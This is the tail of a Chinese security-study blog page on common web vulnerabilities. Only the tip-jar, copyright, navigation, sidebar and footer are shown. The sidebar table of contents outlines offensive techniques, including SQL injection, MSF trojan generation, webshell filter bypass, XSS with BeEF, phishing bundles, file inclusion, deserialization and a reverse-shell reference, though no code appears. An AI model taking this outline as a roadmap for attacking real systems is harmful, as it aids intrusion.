+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt=".N1h1l157 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt=".N1h1l157 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt=".N1h1l157 贝宝">
+        <p>贝宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>.N1h1l157 <i class="ic i-at"><em>@</em></i>X_T
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://n1h1l157.github.io/2023/07/04/SAFE/2%20WEB%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/" title="XD22 Web 通用漏洞">http://n1h1l157.github.io/2023/07/04/SAFE/2 WEB通用漏洞/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2023/07/03/MBTI/INFJ%E5%88%86%E6%9E%90/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;I2FJTgzYkwqh7rd.jpg" title="INFJ 分析">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> MBTI</span>
+  <h3>INFJ 分析</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2023/07/04/SAFE/1%20WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;mg3v58QxFb7tICZ.jpg" title="XD22 Web 基础知识">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> 信息安全</span>
+  <h3>XD22 Web 基础知识</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text"> sql 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlmap-%E6%B5%8B%E8%AF%95"><span class="toc-number">1.1.</span> <span class="toc-text"> sqlmap 测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5-sql-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text"> 手工 sql 注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msf-%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E8%AF%B4%E6%98%8E"><span class="toc-number">1.3.</span> <span class="toc-text"> msf 生成木马说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4"><span class="toc-number">1.4.</span> <span class="toc-text"> 一句话下载文件命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql-%E4%B8%89%E5%A4%A7%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.5.</span> <span class="toc-text"> sql 三大盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.</span> <span class="toc-text"> 宽字节注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.</span> <span class="toc-text"> 堆叠注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">1.8.</span> <span class="toc-text"> 二次注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dnslog%E6%B3%A8%E5%85%A5"><span class="toc-number">1.9.</span> <span class="toc-text"> dnslog 注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.</span> <span class="toc-text"> 文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.</span> <span class="toc-text"> 常见绕过方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#userini-%E5%B7%A7%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text"> .user.ini 巧用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ip%E8%BD%AC%E4%B8%BA%E7%BA%AF%E6%95%B0%E5%AD%97%E8%AE%BF%E9%97%AE"><span class="toc-number">2.3.</span> <span class="toc-text"> ip 转为纯数字访问</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E8%A2%AB%E8%BF%87%E6%BB%A4%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-number">2.4.</span> <span class="toc-text"> 一句话木马被过滤的情况</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%86%99%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.5.</span> <span class="toc-text"> 日志文件写木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AF%BC%E8%87%B4%E7%9A%84%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.6.</span> <span class="toc-text"> 中间件导致的解析漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%AF%BB%E6%89%BE%E5%8F%8A%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7"><span class="toc-number">2.7.</span> <span class="toc-text"> 漏洞寻找及审计技巧</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss-%E8%B7%A8%E7%AB%99"><span class="toc-number">3.</span> <span class="toc-text"> xss 跨站</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xss-%E5%8E%9F%E7%90%86%E5%88%86%E7%B1%BB%E5%8F%8A%E5%AF%BB%E6%89%BE"><span class="toc-number">3.1.</span> <span class="toc-text"> xss 原理分类及寻找</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#beef-xss-%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text"> beef-xss 安装及使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mac%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E8%87%B3%E6%9C%AC%E5%9C%B0"><span class="toc-number">3.3.</span> <span class="toc-text"> mac 克隆网站至本地</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#uxss-flashxss-pdfxss"><span class="toc-number">3.4.</span> <span class="toc-text"> uxss、flashxss、pdfxss</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A8%E5%8D%95%E5%8A%AB%E6%8C%81%E5%AE%9E%E7%8E%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">3.5.</span> <span class="toc-text"> 表单劫持实现权限维持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flash%E9%92%93%E9%B1%BC%E9%85%8D%E5%90%88msf%E6%8D%86%E7%BB%91"><span class="toc-number">3.6.</span> <span class="toc-text"> Flash 钓鱼配合 MSF 捆绑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mac%E4%B8%8Ewin%E4%B8%8A%E4%BA%92%E8%81%94%E6%93%8D%E4%BD%9C"><span class="toc-number">3.7.</span> <span class="toc-text"> mac 与 win 上互联操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xss%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">3.8.</span> <span class="toc-text"> xss 常见绕过方法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xss%E4%BF%AE%E5%A4%8D%E5%8F%8A%E9%98%B2%E6%AD%A2%E6%8E%AA%E6%96%BD"><span class="toc-number">3.9.</span> <span class="toc-text"> XSS 修复及防止措施</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#csrf-ssrf"><span class="toc-number">4.</span> <span class="toc-text"> csrf、ssrf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#241-csrf%E5%8E%9F%E7%90%86-%E5%88%A9%E7%94%A8%E5%8F%8A%E9%98%B2%E5%BE%A1"><span class="toc-number">4.1.</span> <span class="toc-text"> 2.4.1 csrf 原理、利用及防御</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#242-ssrf%E5%8E%9F%E7%90%86-%E5%8D%B1%E5%AE%B3%E5%8F%8A%E4%BF%AE%E5%A4%8D"><span class="toc-number">4.2.</span> <span class="toc-text"> 2.4.2 ssrf 原理、危害及修复</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25-xml-xxe"><span class="toc-number">5.</span> <span class="toc-text"> 2.5 xml、xxe</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#251-xxe%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8"><span class="toc-number">5.1.</span> <span class="toc-text"> 2.5.1 xxe 原理及利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#252-xml%E5%BC%95%E7%94%A8%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="toc-number">5.2.</span> <span class="toc-text"> 2.5.2 xml 引用外部实体</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A2%E7%84%B6%E8%BF%99%E4%B8%AA%E6%95%B0%E6%8D%AE%E6%98%AF%E7%94%A8%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E8%A7%A3%E6%9E%90%E7%9A%84-%E9%82%A3%E4%B9%88%E6%9C%89%E6%B2%A1%E6%9C%89%E5%8F%AF%E8%83%BD%E6%9E%84%E9%80%A0py%E4%BB%A3%E7%A0%81%E7%9B%B4%E6%8E%A5%E7%94%A8py%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90"><span class="toc-number"></span> <span class="toc-text"> 既然这个数据是用脚本语言解析的、那么有没有可能构造 py 代码，直接用 py 代码解析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#253-xml%E6%B5%8B%E8%AF%95%E5%8F%8A%E9%98%B2%E5%BE%A1"><span class="toc-number">0.1.</span> <span class="toc-text"> 2.5.3 xml 测试及防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#26-lfi-rfi"><span class="toc-number">1.</span> <span class="toc-text"> 2.6 lfi、rfi</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#261-lfi%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text"> 2.6.1 lfi 定义及利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#262-lfi%E9%85%8D%E5%90%88%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.6.2 lfi 配合伪协议使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#263-filter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%8A%A0%E5%AF%86"><span class="toc-number">1.3.</span> <span class="toc-text"> 2.6.3 filter 伪协议的加密</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#converticonv%E4%B8%80%E7%A7%8D%E8%BF%87%E6%BB%A4%E5%99%A8%E5%92%8C%E4%BD%BF%E7%94%A8iconv%E5%87%BD%E6%95%B0%E5%A4%84%E7%90%86%E6%B5%81%E6%95%B0%E6%8D%AE%E6%9C%89%E7%AD%89%E5%90%8C%E4%BD%9C%E7%94%A8"><span class="toc-number"></span> <span class="toc-text"> convert.iconv.：一种过滤器，和使用 iconv () 函数处理流数据有等同作用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#27-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">1.</span> <span class="toc-text"> 2.7 文件操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#271-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.1.</span> <span class="toc-text"> 2.7.1 敏感文件下载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#272-%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.7.2 恶意文件删除</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#273-%E9%87%8D%E8%A6%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.3.</span> <span class="toc-text"> 2.7.3 重要文件读取</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#28-rce%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text"> 2.8 RCE 漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90-gui_tools_v-%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B7%A5%E5%85%B7%E9%9B%86%E6%88%90%E5%8C%96%E7%9A%84%E5%B7%A5%E5%85%B7%E7%AE%B1"><span class="toc-number"></span> <span class="toc-text"> 工具推荐 GUI_TOOLS_V… 是一个工具集成化的工具箱</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#29-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text"> 2.9 反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#291-php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8A%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text"> 2.9.1 php 魔术方法及利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#292-php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.9.2 php 反序列化及原生类</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E5%88%A9%E7%94%A8soapclient%E6%9D%A5%E8%BF%9B%E8%A1%8Cssrf"><span class="toc-number"></span> <span class="toc-text"> 直接利用 SoapClient 来进行 SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#293-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-number">0.1.</span> <span class="toc-text"> 2.9.3 java 反序列化利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#294-py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">0.2.</span> <span class="toc-text"> 2.9.4 py 反序列化及魔术方法</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mac%E4%B8%8A%E5%BC%B9%E8%AE%A1%E7%AE%97%E5%99%A8%E7%9A%84%E5%91%BD%E4%BB%A4open-systemapplicationscalculatorapp-win%E5%88%99%E6%98%AFcalc"><span class="toc-number"></span> <span class="toc-text"> mac 上弹计算器的命令 open &#x2F;System&#x2F;Applications&#x2F;Calculator.app ，win 则是 calc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A7%81-httpsforumywhackcomshellphp"><span class="toc-number"></span> <span class="toc-text"> 反弹 shell 的命令见 https:&#x2F;&#x2F;forum.ywhack.com&#x2F;shell.php</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#210-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text"> 2.10 业务逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2101-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B8%8E%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-number">1.1.</span> <span class="toc-text"> 2.10.1 逻辑越权与访问控制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2102-%E6%94%AF%E4%BB%98%E6%B5%81%E7%A8%8B%E5%8F%8A%E9%AA%8C%E8%AF%81%E5%A4%B1%E6%95%88"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.10.2 支付流程及验证失效</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90-httpsgithubcomsmxiazinew_xp_captcha-%E5%8F%AF%E4%BB%A5%E8%A7%A3%E5%86%B3%E7%88%86%E7%A0%B4%E7%94%A8%E6%88%B7"><span class="toc-number"></span> <span class="toc-text"> 验证码爆破插件推荐 https:&#x2F;&#x2F;github.com&#x2F;smxiazi&#x2F;NEW_xp_CAPTCHA , 可以解决爆破用户</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2103-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E4%B8%8Ejohn%E8%A7%A3%E5%AF%86"><span class="toc-number">0.1.</span> <span class="toc-text"> 2.10.3 弱口令爆破与 john 解密</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%97%E5%85%B8%E6%8E%A8%E8%8D%90httpsgithubcomthekingofduckfuzzdicts"><span class="toc-number"></span> <span class="toc-text"> 字典推荐：https:&#x2F;&#x2F;github.com&#x2F;TheKingOfDuck&#x2F;fuzzDicts</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#211-%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text"> 2.11 其他漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2111-crlf%E5%9B%9E%E8%BD%A6%E6%8D%A2%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.</span> <span class="toc-text"> 2.11.1 crlf 回车换行漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2112-url%E9%87%8D%E5%AE%9A%E5%90%91%E4%B8%8Eweb%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.11.2 url 重定向与 web 拒绝服务</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AF%94%E5%A6%82%E6%9C%89%E4%B8%80%E4%B8%AA%E6%97%A0%E9%99%90%E5%A4%A7%E5%B0%8F%E7%9A%84zip%E6%96%87%E4%BB%B6%E5%A6%82%E6%9E%9C%E5%AF%B9%E6%96%B9%E8%87%AA%E5%8A%A8%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%8E%8B%E5%B0%B1%E4%BC%9A%E6%97%A0%E9%99%90%E5%8D%A0%E7%94%A8%E5%AF%B9%E6%96%B9%E7%9A%84%E8%B5%84%E6%BA%90%E5%AF%BC"><span class="toc-number"></span> <span class="toc-text"> 比如有一个无限大小的 zip 文件，如果对方自动进行解压，就会无限占用对方的资源，导</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2113-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8Ecosp%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90"><span class="toc-number">0.1.</span> <span class="toc-text"> 2.11.3 同源策略与 cosp 跨域资源</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2114-jsonp%E8%B7%A8%E5%9F%9F%E5%9B%9E%E8%B0%83"><span class="toc-number">0.2.</span> <span class="toc-text"> 2.11.4 jsonp 跨域回调</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E5%AE%A1%E6%9F%A5%E5%85%83%E7%B4%A0%E7%AD%9B%E9%80%89%E6%88%96burp%E9%A1%B9%E7%9B%AEhttpsgithubcomp1g3jsonp-hunter"><span class="toc-number"></span> <span class="toc-text"> 手工审查元素筛选或 Burp 项目 https:&#x2F;&#x2F;github.com&#x2F;p1g3&#x2F;JSONP-Hunter</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2115-%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E5%AF%BC%E8%87%B4%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1"><span class="toc-number">0.1.</span> <span class="toc-text"> 2.11.5 域名解析导致子域名接管</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/2023/03/18/SAFE/Trojan/" rel="bookmark" title="Trojan 生成">Trojan 生成</a></li><li><a href="/2023/05/19/SAFE/Linux/" rel="bookmark" title="Linux 命令">Linux 命令</a></li><li><a href="/2023/07/02/SAFE/Security%20URL/" rel="bookmark" title="信息安全 网址">信息安全 网址</a></li><li><a href="/2023/07/04/SAFE/1%20WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="bookmark" title="XD22 Web 基础知识">XD22 Web 基础知识</a></li><li class="active"><a href="/2023/07/04/SAFE/2%20WEB%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/" rel="bookmark" title="XD22 Web 通用漏洞">XD22 Web 通用漏洞</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt=".N1h1l157"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">.N1h1l157</p>
+  <div class="description" itemprop="description">人生如逆旅，我亦是行人</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">166</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">5</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">40</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL04xaDFsMTU3" title="https:&#x2F;&#x2F;github.com&#x2F;N1h1l157"><i class="ic i-github"></i></span>
+      <span class="exturl item twitter" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9YVDcyNzgwMzA4" title="https:&#x2F;&#x2F;twitter.com&#x2F;XT72780308"><i class="ic i-twitter"></i></span>
+      <span class="exturl item weibo" data-url="aHR0cHM6Ly9tLndlaWJvLmNuL3Byb2ZpbGUvNTgyOTg0MzUyNQ==" title="https:&#x2F;&#x2F;m.weibo.cn&#x2F;profile&#x2F;5829843525"><i class="ic i-weibo"></i></span>
+      <span class="exturl item about" data-url="aHR0cHM6Ly90Lm1lL24xaDFsMTU3" title="https:&#x2F;&#x2F;t.me&#x2F;n1h1l157"><i class="ic i-address-card"></i></span>
+      <span class="exturl item email" data-url="bWFpbHRvOjEyMjgwNTc4NjlAcXEuY29t" title="mailto:1228057869@qq.com"><i class="ic i-envelope"></i></span>
+      <span class="exturl item facebook" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDA4NDUzNzQwNTEzNw==" title="https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100084537405137"><i class="ic i-facebook"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+    
+  <li class="item">
+    <a href="/links/" rel="section"><i class="ic i-magic"></i>友链</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-clipboard"></i>书架</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/books/LITERATURE/" rel="section"><i class="ic i-fedora"></i>LITERATURE</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/books/VULNHUB/" rel="section"><i class="ic i-android"></i>X_T-VULNHUB</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/books/XIAODI/" rel="section"><i class="ic i-opera"></i>XIAODI-SAFE</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2023/07/03/MBTI/INFJ%E5%88%86%E6%9E%90/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2023/07/04/SAFE/1%20WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2023/06/30/BOOK/48%E3%80%8A%E4%B8%80%E5%8F%A5%E9%A1%B6%E4%B8%80%E4%B8%87%E5%8F%A5%E3%80%8B%E5%88%98%E9%9C%87%E4%BA%91/" title="《一句顶一万句》刘震云">《一句顶一万句》刘震云</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/01/VULNHUB/124%20HACKABLELL/" title="VULNHUB HACKABLELL">VULNHUB HACKABLELL</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/01/VULNHUB/128%20BLUEMOON/" title="VULNHUB BLUEMOON">VULNHUB BLUEMOON</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2023/04/01/MBTI/ISFP%E8%A7%A3%E8%AF%BB/" title="ISFP解读">ISFP解读</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2023/04/01/MBTI/%E5%9B%9B%E4%B8%AA%E5%AD%90%E9%87%8F%E8%A1%A8/" title="四个子量表">四个子量表</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
+</div>
